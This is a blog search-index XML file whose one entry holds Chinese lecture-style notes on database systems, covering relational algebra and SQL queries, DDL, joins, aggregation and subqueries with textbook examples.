<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Database-System]]></title>
    <url>%2F2020%2F01%2F02%2FDatabase-System%2F</url>
    <content type="text"><![CDATA[数据库系统概念引言DBMS定义：由一个相互关联的数据集合和一组用以访问这些数据的程序组成，这个数据集合同城称作数据库(Database)。 DBMS的目标：方便、高效地存取数据库信息 四个基本概念 数据（Data） 数据库（Database） 数据库管理系统（DBMS） 数据库系统（DBS） 数据数据（Data）是数据库中存储的基本对象 数据的定义：描述事物的符号记录 数据的种类：文字、图形、图像、声音 数据的特点：数据与其语义是不可分的 ！数据的形式不能完全表达其内容 数据结构逻辑结构：数据之间存在的逻辑关系，如表、树、图、数组等 物理结构：数据在计算机内的存储方式，如顺序方式、链接方式 数据库数据库（Database，简称DB）是长期储存在计算机内、有组织的、可共享的大量数据集合 数据库的特征 数据按一定的数据模型组织、描述和储存 可为各种用户共享 冗余度较小 数据独立性较高 易扩展 数据库管理系统数据库管理系统（Database Management System，简称DBMS）由一个相互关联的数据的集合和一组用以访问这些数据的程序组成，是位于用户与操作系统之间的一层数据管理软件。 用途：科学地组织和存储数据、高效地获取和维护数据 数据定义功能：提供数据定义语言（DDL），定义数据库中的数据对象 数据操作功能：提供数据操纵语言（DML），操纵数据实现对数据库的基本操作（增删改查） 数据库的运行管理：保证数据的安全性、完整性，保证多用户对数据的并发使用，发生故障后的系统恢复 数据库的建立和维护功能：数据库数据批量装载，数据库转储，介质故障恢复，数据库的重组织，性能监视 数据库系统数据库系统（Database System，简称DBS）是指在计算机系统中引入数据库后的系统，在不引起混淆的情况下常常把数据库系统简称为数据库 数据库系统的组成：由数据库、数据库管理系统、应用系统（及其开发工具）、数据库管理员（和用户）构成 如下图所示 下图为各系统间的关系 数据管理技术数据管理：对数据进行分类、组织、编码、存储、检索和维护，是数据处理的中心问题 数据管理的发展动力：应用需求的推动；计算机硬件的发展；计算机软件的发展。 发展阶段：①人工管理阶段（50年代中期以前）②文件系统阶段（50年代后期~60年代中期）③数据库系统阶段（60年代后期开始） 早期，数据库应用程序直接建立在文件系统之上，文件系统的弊端如下： 数据的冗余和不一致性：多种文件格式，相同的信息在几个文件重复存储 数据访问困难：对于每一个新任务，需要写一个程序 数据孤立：数据分散在不同格式的多个文件中 完整性问题：一致性约束“淹没”在程序代码中，增加新约束或修改现有约束很困难 更新的原子性问题：难以保持原子性，执行部分更新，是的数据处于不一致状态 多用户的并发访问异常：系统的总体性能和相应速度要求：并发访问数据，没有控制的并发访问导致不一致性 安全性问题：控制用户只存取部分数据难以实现 数据库的观点：数据不是依赖于处理过程的附属品，而是现实世界中独立存在的对象 数据统一按表结构存放 数据库VS文件系统 实例与模式Instance and Schemas 型(Schema)与值(Instance)的区别： 型是对数据的结构和属性的说明——模式 值是型的一个具体赋值——实例 型是相对稳定的，值是随时间不断变化的 123456class person&#123; public: string name; string address;&#125;;person Tom;//person是型,Tom是变量,Tom在某时刻的值是实例 模式：数据库的总体设计 通过高级程序设计语言进行类比 物理模式：在物理层描述的数据库设计 逻辑模式（子模式）：在逻辑层描述的数据库设计 实例：在特定时刻存储在数据库中的信息集合 类似于一个变量的值 物理数据的独立性：物理模式的改变而不会影响逻辑模式 应用依赖于逻辑模式 在一般情况下，应明确定义不同层次之间和组件之间的接口，这样某些部分的改变不会对其他部分造成较大影响 逻辑数据的独立性 当模式改变时，修改外模式（模式映像），使外模式保持不变，从而应用程序可以保持不变，称为数据的逻辑独立性 数据视图物理层：描述数据存储 逻辑层：描述存储在数据库中的数据，以及数据间的关系 视图层：最高层次的抽象，只描述整个数据库的某部分数据。视图层提供了防止用户访问数据库的某些部分的安全性机制 如图，下图的COBOL和PL/I是由由逻辑层创建的两个视图，而最下面那个即是物理层所存放的数据 数据模型数据库结构的基础是数据模型 数据模型描述的内容：数据、数据关系、数据语义、数据约束 常用数据模型：关系模型、实体-联系数据模型（ER模型，主要用于数据库设计）、基于对象的数据模型（oo数据模型，面向对象和对象关系）、半结构化数据模型（XML，可扩展标记语言）、其他模型（如网状模型、层次模型）等 数据库语言 DML（Data Manipulaton Language）：操纵按照某种适当的数据模型组织起来的数据的语言 查询 更新（增、删、改） DML分类：①过程化：用户指定需要什么数据以及如何获得这些数据；②声明式（非过程化）：用户指定需要什么数据，而不指明如何获得这些数据 SQL是应用最广泛的DML DDL（Data Definition Language）：用于定义数据库模式以及其他特征的语言 数据库模式 完整性约束： 主键（ID，用来确定唯一的instructor） 参照完整性（SQL中的参照约束） 断言 授权 DDL编译器产生一系列存储在数据字典中的表，数据字典包含元数据（元数据是关于数据的数据） 关系数据库SQL：是一门广泛使用的非过程化语言 12345678910111213# 例# SQL-DMLselect instructor.ID, department.buildingfrom instructor, departmentwhere instructor.dept_name = department.dept_name and department.dept_nmae = 'Physics';# SQL-DDLcreate table deptment( dept_name char(20), building char(20), budget numberic(12,2)); 来自应用程序的数据库访问：DML由宿主语言执行 数据库设计数据库设计的主要内容是数据库模式的设计 数据库设计过程： 获取用户需求 概念设计 逻辑设计 物理设计 现实世界是实体及其实体之间关系的集合 实体：现实世界中区别于其他对象的事情或物体，实体被一组属性所描述 关系：几个实体之间的关联 可以用实体关系图（entity-relationship diagram，E-R图）来表示 规范化：数据库设计的另外一种方法，目标是生成一个关系模式集合，是我们的存储信息是没有不必要的冗余，同时又能方便地检索数据 规范化最常用的方法就是使用函数依赖 规范化也提供了判定一个关系模式优劣的标准 数据存储和查询存储管理器是一个程序模块，提供了数据库中存储的低层数据与应用程序以及向系统提交的查询之间的接口 存储管理器的任务 与文件管理器交互 对数据的有效的存储、查询、更新 存储管理器部件 权限及完整性管理器 事务管理器 文件管理器 缓冲区管理器 查询管理器查询管理器的组件包括 DDL解释器：他解释DDL语句，并将这些定义记录在数据字典中 DML编译器：将查询语言中的DML语句翻译成为一个执行方案 查询执行引擎：执行由DML编译器产生的低级指令 查询处理器的工作过程 解析和转换 优化 计算 过程如下图 两方面来评估一个给定查询：①正则表达式②每个操作有不同的实现算法 需要估计操作的开销：关键取决于数据库需要维护的关系的统计信息；需要顾及中间结果的统计数据，从而计算复杂的表达式成本 事务管理事务是由一系列操作序列构成的程序执行单元，是一个不可分割的工作单位 事务管理组件保证了当系统出现了故障（例如电源故障、操作系统崩溃）或事务失败时，数据库仍然保持一致性（正确性） 并发控制管理器控制了并发事务间的相互影响，保证数据库的一致性 数据库系统内部结构 数据库体系结构数据库系统的体系结构很大程度上取决于数据库系统所运行的计算机系统 集中式 客户/服务器式 远程数据库用户工作用的客户机（Clinet） 运行数据库系统的服务器（Server） 并行（多处理器） 并行系统通过并行地使用多个处理器和磁盘来提高处理速度和I/O速度 分布式 在分布式数据库系统中，数据库存储于几台计算机中，分布式系统中的计算机之间通过网络相互通信，他们不共享主存储器或磁盘 数据挖掘数据挖掘式应用一系列技术从大型数据库或数据仓库中提取人马感兴趣的信息和知识，这些知识或信息式隐含的，实现未知而潜在有用的，提取的知识表示为概念、规则、规律、模式等形式 数据挖掘式一类深层次的数据分析 数据库管理员对数据库系统进行集中控制的人称作数据库管理员（Database Administrator） DBA的作用 模式定义 存储结构及存取方法定义 模式及物理组织的修改 数据访问授权 日常维护 关系模型关系理论是建立在集合代数理论基础上的，有坚实的数学基础 关系数据结构 单一的数据结构——关系：现实世界中的实体及实体间的各种联系均用关系来表示 数据的逻辑结构——二维表：从用户角度，关系模型中的数据的逻辑结构是一张二维表 属性的类型 每个属性的可能的取值范围（集合）叫属性的域 属性的值（通常）要求为原子的，也就是说，不可再分的 属性的原子性问题要根据应用的需求确定 null（空值）：是一个特殊的值，表示值未知或不存在 空值给数据库访问和更新带来了很多困难 关系的基本概念关系笛卡尔积D1 × D2 × … × Dn 的子集叫做在域D1，D2 ，…，Dn 上的关系，用R(D1，D2 ，…，Dn )表示 R是关系的名字，n是关系的度或目 关系是笛卡尔积中有意义的子集 关系也可以表示为二维表 关系模型和实例123456A1,A2,...,An 是属性R = (A1,A2,...,An) 是一个关系模式例:instructor = (ID,name,dept_name,salary)形式上，给定集合D1,D2,...,Dn,一个关系r是D1×D2×...×Dn 的一个子集,因此,一个关系是一组n元组(a1,a2,...,an)的集合，其中ai ∈ Di 关系的当前值（关系实例）可以用一个表指定 元素t是关系r中的一个元组，表中一行代表一个元组 数据库由多个关系组成 码 码的作用：我们必须有一种能够区分给定关系中不同元组的方法。我们一般用元组中的属性表明，即一个元组的属性值必须是能够唯一区分元组的，一个关系中没有两个元组在所有属性上的取值都相同 超码：超码是一个或者多个属性的集合，这些属性的组合可以使我们在一个关系中唯一地标识一个元组（例如，{ID}和{ID，name}都是instructor的超码） 候选码：最小的超码称为候选码，即超码的任意真子集都不能成为超码（例如，{ID}是Instructor的一个候选码） 主码：从一个关系的多个候选码中选定一个作为主码（习惯上把主码属性放在其他属性前面，并且加下划线） 外码：一个关系模式r1可能在他的属性中包含另一个关系r2的主码，这个属性称作r1上参照r2的外码（r1和r2可以是同一个关系） 关系r1称作外码依赖的参照关系 关系r2称作外码的被参照关系 关系查询语言查询语言是用户用来从数据库中请求获取信息的语言 广泛应用的查询语言：SQL “纯”查询语言 关系代数（过程化） 元组关系演算（非过程化） 域关系演算（非过程化） 关系操作 基本操作 一元运算 选择、投影、更名 多元运算 笛卡尔积、并、集合差 其他运算 集合交、θ连接，自然连接、除、赋值 自然连接：设r和s是关系模式R和S的实例，R和S关系实例的自然连接是关系模式R∪S的实例，遵守以下规则：①对于每一对元组 tr 和 ts ，其中 tr 来自r，ts 来自s；②如果 tr 和 ts 在属性组R∩S上的每个属性值都一样，添加一个元组t到结果集，其中 t由tr 在r上相同的值，t有 ts 在s上相同的值 笛卡尔积运算从两个关系中合并元组，但不同于连接运算的是，其结果包含来自两个关系元组的所有对，无论它们的属性是否匹配 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176# 选择元组Relation r: A B C D α α 1 7 α β 5 7 β β 12 3 β β 23 10select tuples with A=B and D&gt;5σ A=B and D&gt;5 (r)ans: A B C D α α 1 7 β β 23 10 ------------------------------# 选择列(属性)Relation r: A B C α 10 1 α 20 1 β 30 1 β 40 2select A and CProjectionΠ A,C (r)ans: A C α 1 β 1 β 2------------------------------# 连接两个关系# 笛卡尔积Relation r,s: r A B α 1 β 2 s C D E α 10 a β 10 a β 20 b γ 10 br × s: A B C D E α 1 α 10 a α 1 β 10 a α 1 β 20 b α 1 γ 10 b β 2 α 10 a β 2 β 10 a β 2 β 20 b β 2 γ 10 b------------------------------# 并运算Relation r,s: r A B α 1 α 2 β 1 s A B α 2 β 3 r ∪ s: A B α 1 α 2 β 1 β 3 ------------------------------# 差运算Relation r,s: r A B α 1 α 2 β 1 s A B α 2 β 3 r - s: A B α 1 β 1 ------------------------------# 交运算Relation r,s: r A B α 1 α 2 β 1 s A B α 2 β 3r ∩ s: A B α 2 ------------------------------# 自然连接Relation r,s r A B C D α 1 α a β 2 γ a γ 4 β b α 1 γ a δ 2 β b s B D E 1 a α 3 a β 1 a γ 2 b δ 3 b ε Natural Joinr ⋈ s: A B C D E α 1 α a α α 1 α a γ α 1 γ a α α 1 γ a γ δ 2 β b δ------------------------------# 连接两个关系# 笛卡尔积------------------------------ SQLSQL：Structured Query Language 商用系统一般支持sql-92的大部分特性，并支持后续的扩充标准中部分的扩充特性，以及系统特殊的自有特性 体系结构：user==(==&gt;view==&gt;table)==&gt;base table==&gt; stored file SQL功能 操作符 数据查询 Select 数据定义 Create、Alter、Drop 数据操纵 Insert、Update、Delete 数据控制 Grant、Revoke 数据定义SQL的数据定义语言（DDL）能够定义每个关系的信息，包括①每个关系的模式；②每个属性的值域；③完整性约束；④将来的信息，如每个关系的索引集合，每个关系的安全性和权限信息，磁盘上每个关系的物理存储结构 SQL的基本类型 char(n)：固定长度的字符串，用户指定长度n varchar(n)：可变长度的字符串，用户指定最大长度n int：整数类型（和机器相关的整数类型的有限子集） smallint：小整数类型（和机器相关的整数类型的子集） numeric(p,d)：定点数，精度由用户指定，这个数有p位数字，其中d位数字在小数点右边 real，double，precision：浮点数与双精度浮点数，精度与机器相关 float(n)：浮点数，精度由用户指定，精度至少为n位 创建表结构使用create table命令创建一个SQL关系表： 1234567891011121314151617create table r( A1 D1, A2 D2, ..., An Dn)# r是关系名# 每个Ai是关系模式r的一个属性名# Di是属性Ai的域的类型#例create table instructor(ID char(5), name varchar(20) not null, dept_name varchar(20), salary numeric(8,2) ) insert into instructor values (‘10211’, ’Smith’, ’Biology’, 66000); Create table中的完整性约束 not null primary key(A1,A2,...,An) foreign key(Am,...,An) references r 注：被声明为主码的属性自动被确保为not null 例： 123456789101112131415161718create table instructor( ID char(5), name varchar(20) not null, dept_name varchar(20), salary numeric(8.2), primary key(ID), foreign key(dept_name) references department)create table takes( ID varchar(5), course_id varchar(8), sec_id varchar(8), semester varchar(6), year numeric(4,0), grade varchar(2), primary key (ID,course_id,sec_id,semester,year), foreign key (ID) references student, ) 主码的声明和属性的声明可以放在一起，例如course_id varchar(8) primary key, 删除和更改表结构123456789101112131415161718192021# 删除表和他的内容drop table student# 删除表中的内容,但是保留表delete from student# 更改表结构alter table# 属性A是关系r将要增加的属性,D是A的域# 对于关系r中的所有元组,在新增加的属性上的取值都为nullalter table r add A D# A是关系r的一个属性名# 许多数据库不支持删除属性的操作alter table r drop A# 修改表中属性A的数据类型,将A的域改为D# 可能破坏原有的数据alter table r modify A D 索引建立索引是加快查询速度的有效手段 建立索引：由DBA或表的属主（建立表的人）根据需要建立索引；或者有些DBMS自动建立特定列上（Primary key，unique）的索引 维护索引：DBMS自动完成 使用索引：DBMS自动选择是否使用索引以及使用哪些索引 定义的格式 12345678create [unique | distinct] [cluster] index index_name on table_name (col_name [asc | desc] [,col_name asc|desc,...])# unique(distinct): 唯一性索引，不允许表中不同的行在索引列上取相同的值.若已有相同值存在,则系统给出相关信息,不建此索引.系统并拒绝违背唯一性的插入、更新# cluster: 聚集索引,表中元组按索引项的值排序并物理地聚集在一起.一个基本表上只能建一个聚集索引# asc|desc: 索引表中索引值的排序次序,缺省为ascdrop index index_name# 删除索引 索引的有关说明 可以动态地定义索引，即可以随时建立和删除索引 不允许用户在数据操作中引用索引。索引如何使用完全由系统决定，这支持了数据的物理独立性 应该在使用频率高的、经常用于连接的列上建索引 一个表上可建多个索引。索引可以提高查询效率，但索引过多耗费空间，且降低了插入、删除、更新的效率 创建索引123456789create table student( ID varchar(5), name varchar(20) not null, dept_name varchar(20), total_credit numeric(3,0) default 0, primary key(ID))create index studentID_index on student(ID) 索引是一种数据结构，用于加快查询在索引属性上取给定值的元组的速度 ==&gt;详细见后面 #索引 SQL查询的基本结构SQL的数据操纵语言（DML）提供了从数据库中查询信息，以及在数据库中插入元组、删除元组、修改元组的能力 SQL中的标识符大小写不敏感 Selectselect子句用于列出查询结果中所需要的属性，与关系代数中的投影运算相对应 SQL允许在关系和查询结果中保留重复的元组 强制去重，需要在select之后使用关键字distinct *一般代表所有属性，是一个通配符 Select子句可包含+、-、*、/运算符的算数表达式,运算对象可以是常量或者元组的属性 123456789101112131415161718192021# 典型的查询语句# Ai表示一个属性,ri表示一个关系,P是一个谓词(即可以是一个条件判断)select A1,A2,...,Anfrom r1,r2,...,rnwhere P# 去重select distinct dept_name from instructor # 关键词all显式指明不去重复select all dept_name from instructor # *代表所有属性select * from instructor # Select子句可包含+、-、*、/运算符的算数表达式,运算对象可以是常量或者元组的属性select ID,name,salary/12 from instructor wherewhere子句指定查询结果必须满足的条件，与关系代数中的选择谓词相对应 比较结果可以使用逻辑连词and，or，not连接 比较结果可以用于算术表达式 语法成分： 逻辑运算符：and，or，not 比较运算符：&lt;，&lt;=，&gt;，&gt;=，=，&lt;&gt; between条件：判断表达式的值是否在某范围内，例如 age between 18 and 20==age∈[18,20]，not between ... and ... 1234# 找出所有在Computer Science系并且工资超过80000美元的教师的姓名select namefrom instructorwhere dept_name = &apos;Computer Science&apos; and salary &gt; 80000 fromfrom子句列出了查询中的包含关系，与关系代数中的笛卡尔积运算相对应 笛卡尔积不是经常被直接使用，他在使用时经常与where子句（关系代数的选择操作）一起使用 1234# 求笛卡尔积instructor × teacher# 产生所有的instructor-teacher对,包含两个关系的所有属性select * from instructor, teacher 连接12345# 例# 对于大学所有讲授课程的教师,找出他们的姓名以及所讲授的课程的标识select name,course_idfrom instructor,teacherwhere instructor.ID = teacher.ID 连接查询及执行过程同时涉及多个表的查询称为连接查询 用来连接两个表的条件称为连接条件或连接谓词 一般格式：[&lt;table_name1&gt;.]&lt;col_name1&gt;&lt;比较运算符&gt;[&lt;table_name2&gt;.]&lt;col_name2&gt; [&lt;table_name1&gt;.]&lt;col_name1&gt; between [&lt;table_name2&gt;.]&lt;col_name2&gt; AND [&lt;table_name3&gt;.]&lt;col_name3&gt; 连接字段：连接谓词中的列名称为连接字段。连接条件中的各连接字段类型必须是可比的，但不必是相同的 嵌套循环法（Nested-Loop） 首先在表1中找到第一个元组，然后从头开始扫描表2，逐一查找满足连接件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。 表2全部查找完后，再找表1中第二个元组，然后再从头开始扫描表2，逐一查找满足连接条件的元组，找到后就将表1中的第二个元组与该元组拼接起来，形成结果表中一个元组 重复上述操作，直到表1中的全部元组都处理完毕 排序合并法（Sort-Merge） 首先按照连接属性对表1和表2排序 对表1的第一个元组，从头开始扫描表2，顺序查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。当遇到表2中第一条大于表1连接字段值的元组时，对表2的查询不再继续 找到表1的第二条元组，然后从刚才的中断点处继续顺序扫描表2，查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。直接遇到表2中大于表1连接字段值的元组时，对表2的查询不再继续 重复上述操作，直到表1或表2中的全部元组都处理完毕为止 索引连接法（Index-Join） 对表2按连接字段建立索引 对表1中的每个元组，依次根据其连接字段值查询表2的索引，从中找到满足条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组 自然连接自然连接只考虑两个关系模式中都出现的属性上取值相同的元组对，并且相同属性的列只保留一个副本 123456789select *from instructor natural join teacherselect name,course_idfrom instructor, teacherwhere instructor.iD = teacher.ID||select name,course_idfrom instructor natural join teacher 自然连接中的危险：有些属性可能具有相同的名称，但是他们的实际意义是不同的，在这种情况下，他们可能被错误的认为是相同属性 123456789101112# 例# 错误的写法(使course.dept_name = instructor.dept_name)select name, titlefrom instructor natural join teaches natural join course;# 正确的写法select name, titlefrom instructor natural join teaches, course where teaches.course_id = course.course_id;# 另一个正确的写法select name, titlefrom (instructor natural join teaches) join course using(course_id); 更名运算SQL允许使用as子句对关系和属性进行更名 1old_name as new_name 在Oracle中，关键词as必须被省略 12345678#例select ID,name,salary/12 as monthly_salaryfrom instructor# 找出满足工资至少比Computer Science系某一个教师的工资要高的教师姓名select distinct T.namefrom instructor as T,instructor as Swhere T.salary &gt; S.salary and S.dept_name = &apos;Computer Science&apos; 字符串运算SQL中通过字符串匹配运算来支持在字符串上的比较，使用like操作符来实现模式匹配，使用两个特殊字符（通配符）描述模式 百分号（%）：%字符匹配任何子串 下划线（_）：_字符匹配任何字符 Like的单向性： &#39;济南市山大路&#39; like &#39;济南市%&#39; = true &#39;济南市%&#39; like &#39;济南市山大路&#39; = false 12345678# 例# 找出名字中包含dar的教师名字select namefrom instructorwhere name like &apos;%dar%&apos;# 匹配字符串“100 %”str like &apos;100 \%&apos; escape &apos;\&apos; EscapeEscape定义转义字符，以去掉特殊字符的特定含义，使其被作为普通字符对待，如用escape &#39;\&#39;，定义\作为转义字符，则可用\%去匹配%，用\_取匹配_ 12&apos;ab\%cd%&apos; escape &apos;\&apos; = &apos;ab%cd&apos;&apos;ab\\cd%&apos; escape &apos;\&apos; = &apos;ab\cd&apos; VALUE是大小写敏感的 模式匹配的例子： ‘Intro%’ 匹配任何以“Intro”打头的字符串 ‘%Comp%’ 匹配任何包含“Comp” 子串的字符串 ‘_ _ _’匹配只含三个字符的字符串 ‘_ _ _ %’匹配至少含三个字符的字符串 SQL 支持一系列的串运算，包括 串联 （使用“||”） 大小写转换 计算串长度, 抽取子串, 等等 排列元组的显示次序1234567891011# 例# 按字母顺序排列出所有教师的名字select distinct namefrom instructororder by name# 我们可以用desc指定降序,用asc指定升序,默认情况下是升序排列order by name desc# 可以在多个属性上进行排序order by dept_name,name 只是显示次序排序，只能是sql的最后一个子句，只能出现目标列内的字段 当排序列含空值时，ASC排序列为空值的元组最后显示，DESC排序列为空值的元组最先显示 where子句谓词12345678# 元组比较select name,course_idfrom instructor, teacherwhere (instructor.ID, dept_name) = (teacher.ID, &apos;Biology&apos;)# 表示方法: (v1,v2,...,vn)# 元组比较: 按照字典顺序进行比较# 例如 (a1,a2)&lt;=(b1,b2) === (a1&lt;b1)or ((a1=b1) and (a2&lt;=b2)) 重复 对于存在重复元组的关系，SQL 可以决定在结果中显示该元组的几个副本 一些关系代数运算的多重集版本——给定多重集关系r1 和r2 ： σθ (r1)：如果关系r1的元组t1有c1个副本，并且t1满足选择条件σθ ，则在 σθ 里有c1个t1的副本 ΠA (r)：对于关系r1的每个元组t1的每个副本，在ΠA (r1)里都有一个副本ΠA (t1) ，ΠA (t1)是r1中相应副本t1的投影 r1 x r2：如果关系r1的元组t1有c1个副本，关系r2的元组t2有c2个副本，则关系r1 x r2的元组t1，t2有c1 x c2个副本 集合运算集合运算union，intersect和except，每个运算都自动去重 union：并集；intersect：交集；except：差集(在Oracle中，是minus)； 如果要保留重复，则要使用对应的多重集版本union all，intersect all，except all 如果一个元组在r中出现m次，在s中出现n次，那么： r union all s：m+n次 r intersect all s：min(m,n)次 r except all s：max(0,m-n)次 1234567891011121314151617181920212223242526# 例# 找出在2009年秋季开课，或者在2010年春季开课，或两个学期都开课的所有课程(select course_id from section where sem = ‘Fall’ and year = 2009)union(select course_id from section where sem = ‘Spring’ and year = 2010)# 找出在2009年秋季和2010年春季都开课的所有课程(select course_id from section where sem = ‘Fall’ and year = 2009)intersect(select course_id from section where sem = ‘Spring’ and year = 2010)# 找出在2009年秋季学期开课但不在2010年春季学期开课的所有课程(select course_id from section where sem = ‘Fall’ and year = 2009)except/minus(select course_id from section where sem = ‘Spring’ and year = 2010) 空值元组的一些属性可以为空值，用null表示 null代表一个不知道或不存在的值 包含null的任何算术表达式的计算结果是null，比如5+null = null 谓词：is null可以用来检测空值，但是不能写 `var = null 带有null的任何比较运算返回 unknown，比如5&lt;null := unknown，null&lt;&gt;null := unknown，null = null := unknown 三值逻辑使用真值unknown or：(unknown or true) = true，(unknown or false) = unknown，(unknown or unknown) = unknown and：(unknown and true) = unknown，(unknown and false) = falses，(unknown or unknown) = unknown not：not unknown = unknown 若谓词P的值为unknown，则P is unknown = true where子句中谓词对一个元组计算出的值如果为unknown，则结果当false处理 聚集函数聚集函数以一个值的集合（集或多重集）为输入，返回单个值 avg：平均值 min：最小值 max：最大值 sum：总和 count：计数 聚集函数的性质同关系代数：①聚集函数作用域集合（多重集）返回单值；②聚集函数作用默认作用于多重集；③强制作用于集合，使用distinct。 （无分组）仅用聚集函数的SQL：SQL返回关系，返回的关系有且只有一行；Select子句中出现聚集函数，不能同时出现非聚集的属性 1234567891011121314# 例# 找出Computer Science系教师的平均工资select avg(salary)from instructorwhere dept_name = &apos;Computer Science&apos;# 找出在2012年春季学期讲授的课程的教师总数select count(distinct ID)from teacherwhere semester = &apos;Spring&apos; and year = 2010# 找出course关系中的元组数select count(*)from course group by子句在关系子集上运用聚集函数，得到一个新的关系 group by子句的作用对象是查询的中间结果表 分组方法：按指定一列或多列值分组，值相等为一组 使用Group by子句后，Select子句的列名列表中只能出现分组属性和聚集函数，不能出现非聚集的非分组属性 分组聚集计算时，SQL返回关系，每组对应一行，无组时返回空关系 12345# 例# 计算每个系的教师的平均工资,dept——name为系名select dept_name, avg(salary)from instructorgroup by dept_name; having子句having是对分组聚集结果进行选择，不满足条件的舍弃 having子句的谓词在形成分组后起作用，where子句中的谓词在分组之前起作用 1234select dept_name,avg(salary)from instructorgroup by dept_namehaving avg(salary)&gt;42000 空值和聚集 除了count(*)，所有其他的聚集运算都忽略聚集属性上为空值的元组 如果集合只有空值（输入值集合为空集），则count(*)运算值为0，其他所有的运算返回空值 1234# 计算所有工资总额的查询# 该语句忽略了空值,若没有非空的salary,则结果为nullselect sum(salary)from instructor 嵌套子查询SQL提供了一个子查询嵌套的机制 一个子查询是一个嵌套在其他的查询中的select-from-where表达式 子查询通常用于对集合成员的资格、集合的比较、集合的基数进行检查 集合成员的资格：in 集合之间的比较：θ 测试集合是否为空：exists 测试集合是否存在重复元组：unique 1234567891011121314151617181920212223242526272829303132333435363738# 例# 找出在2009年秋季和2010年春季同时开课的所有课程select distinct course_idfrom sectionwhere semester = &apos;Fall&apos; and year = 2009 adn course_id in (select course_id from section where semester = &apos;Spring&apos; and year = 2010); # 找出在2009年球季学期开课但不在2010年春季学期开课的所有课程select distinct course_idfrom sectionwhere semester = &apos;Fall&apos; and year = 2009 and course_id not in (select course_id from section where semester = &apos;Spring&apos; and year = 2010);# 找出（不同的）学生总数，他们选修了ID为10101的教师所讲授的课程select count (distinct ID)from takeswhere (course_id, sec_id, semester, year) in (select course_id, sec_id, semester, year from teaches where teaches.ID= 10101);------# 找出满足下面条件的所有教师的姓名，他们的工资至少比Biology系某一个教师的工资要高 select distinct T.namefrom instructor as T, instructor as Swhere T.salary &gt; S.salary and S.dept_name = ’Biology’;# 有些查询使用 &gt;some 子句select namefrom instructorwhere salary &gt; some (select salary from instructor where dept_name = ’Biology’); some，any，all子句F &lt;comp&gt; some r &hArr; ∃ t ∈ r 使得( F &lt;comp&gt; t )，其中&lt;comp&gt;可以是&lt;,&lt;=,&gt;,&gt;=,&lt;&gt; (= some) ≡ in ALL 父查询中的结果集大于子查询中每一个结果集中的值,则为真 ANY,SOME 父查询中的结果集大于子查询中任意一个结果集中的值,则为真 All：只有当其所有数据都满足条件时，条件才成立Any：只要有一条数据满足条件，条件就成立Some：其中存在一些数据满足条件，作用和Any大致相同 常规的使用中看作一致即可 F &lt;comp&gt; all r &hArr; ∀ t ∈ r（F &lt;somp&gt; t） (≠ all) ≡ not in some和all谓词可以用聚集函数实现 = &lt;&gt;或!= &lt; &lt;= &gt; >= some in – &lt;max &lt;=max >min >=min all – not in &lt;min &lt;=min >max >=max 空关系测试exists结构测试子查询结果是否有元组，子查询非空的时候，返回true exists r &hArr; r ≠ Φ not exists r &hArr; r = Φ exists谓词 存在量词∃ 带有exists谓词的子查询不返回任何数据，只产生逻辑真值true或逻辑假值false 若内层查询结果非空，则返回真值 若内层查询结果为空，则返回假值 由exists引出的子查询，其目标列表达式通常都用*，因为带exists的子查询只返回真值或假值，给出列名无实际意义 123456789101112131415161718# 例# 另一种表述查询“找出在2009年秋季和2010年春季同时开课的所有课程的集合”的方式select course_idfrom section Swhere semester = ’Fall’ and year= 2009 andexists (select * from section as T where semester=’Spring’and year=2010 and S.course_id= T.course_id);# 2select course_idfrom sectionwhere semester = ’Fall’ and year= 2009 andcourse_id in (select course_id from section where semester=’Spring’and year=2010); 相关子查询：in后的子查询与外层查询无关，每个子查询执行一次，而exists后的子查询与外层查询有关，需要执行多次，称之为相关子查询 执行过程： 首先取外层查询中表的第一个元组，根据它与内层查询相关的属性值处理内层查询，若WHERE子句返回值为真，则取此元组放入结果表 然后再取外层表的下一个元组 重复这一过程，直至外层表全部检查完为止 sql中全部概念的处理全部在sql中的三种写法 ∀：not exists(not exists) 超集superset：not exists(X except Y) ÷：not in(not in) 用EXISTS表示超集 若A为B的超集，则NOT EXISTS (B EXCEPT A) 为TRUE 对于B EXCEPT A，可以表达为：在B中存在，但在A中不存在的记录，也可以用NOT EXISTS 来表达 因此超集可以用两个NOT EXISTS 的嵌套来表达，也可以用两个NOT IN 的嵌套来表达 巧用逆否命题的等价 123456789101112131415161718192021222324252627282930313233# 例# 列出选修了全部课程的学生姓名# 任意课程，所求学生选之⇔不存在任何一门课程，所求学生没有选之select SNAMEfrom Swhere not exists(select Cno from C where not exists(select * from SC where SC.Cno = C.Cno and SC.Sno = S.Sno)) # 任意课程，所求学生选之⇔所求学生的选课集合为所有课程集合的超集select SNAMEfrom Swhere not exists((select Cno from C) except (select Cno from SC where SC.Sno = S.Sno))#任意课程，所求学生选之⇔所求学生不在如下集合中：学生学号与任一课程的组合不全包含在SCselect SNAMEfrom Swhere Sno not in (select Sno from C,S where (Sno,Cno) not in (select Sno,Cno from SC)) 测试没有重复的元组unique结构测试一个子查询的结果中是否有重复的元组，在空集中其值为true 1234567# 例# 找出所有2009年最多开设一次的课程select T.course_idfrom course Twhere unique (select R.course_id from section R where T.course_id = R.course_id and R.year = 2009) from子句中的子查询sql允许from子句中的子查询的表达式 1234567# 例# 找出系平均工资超过42000美元的那些系中教师的平均工资select dept_name, avg_salaryfrom (select dept_name, avg (salary) avg_salary from instructor group by dept_name)where avg_salary &gt; 42000; with子句with子句提供了定义临时关系的方法，这个定义支队包含with的子句的查询有效 12345678# 例# 找出具有最大预算值的系with max_budget (value) as (select max(budget) from department)select budgetfrom department, max_budgetwhere department.budget = max_budget.value; with子句在写复杂查询时非常有用 标量子查询SQL允许子查询出现在返回单个值的表达式能够出现的任何地方，只要该子查询只返回包含单个属性的单个元组；这样的子查询称为标量子查询（scalar subquery） 标量子查询只返回包含单个属性的单个元组 如果子查询的结果返回多个元组，则会产生运行错误 数据库的修改 从一个给定的关系中删除元组：delete from 